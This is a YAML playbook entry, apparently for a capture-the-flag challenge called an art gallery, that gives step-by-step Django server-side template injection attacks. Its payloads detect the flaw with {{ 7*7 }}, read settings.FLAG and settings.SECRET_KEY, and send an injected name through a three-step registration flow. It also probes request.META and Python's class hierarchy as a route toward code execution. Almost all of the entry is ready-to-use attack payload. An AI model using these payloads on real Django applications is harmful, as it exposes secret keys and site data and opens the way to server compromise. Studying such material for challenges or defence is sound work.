name: django_ssti_art_gallery
category: web
tags: [ssti, django, template_injection, python]
indicators:
  - "Django template engine"
  - "User input in template rendering"
  - "String replace/concatenation in template"
  - "from_string() method usage"
  - "Filter only blocks '%' but not '{{ }}'"

tricks:
  - name: "Step 1: Identify SSTI"
    when: "Found user input reflected in page"
    how: "Test with Django template expression"
    payload: |
      {{ 7*7 }}
      # If returns "49", SSTI confirmed
      # Django uses {{ }} for expressions

  - name: "Step 2: Access Django settings"
    when: "SSTI confirmed in Django"
    how: "Access settings object for secrets"
    payload: |
      {{ settings.FLAG }}
      {{ settings.SECRET_KEY }}
      # Django settings are accessible in templates

  # pragma: allowlist secret
  - name: "Step 3: Multi-step registration exploit"
    when: "Vulnerable input in registration flow"
    how: "Submit payload through registration steps"
    payload: |
      # Step 1: POST /accounts/register/step1/
      # name={{ settings.FLAG }}&password=password1234

      # Step 2: POST /accounts/register/step2/
      # email=test@test.com

      # Step 3: GET /accounts/register/step3/
      # SSTI payload rendered in JavaScript alert

  - name: "Alternative payloads"
    when: "Need code execution"
    how: "Django SSTI RCE techniques"
    payload: |
      # Access request object
      {{ request.META }}

      # Access class hierarchy (if available)
      {{ ''.__class__.__mro__[1].__subclasses__() }}
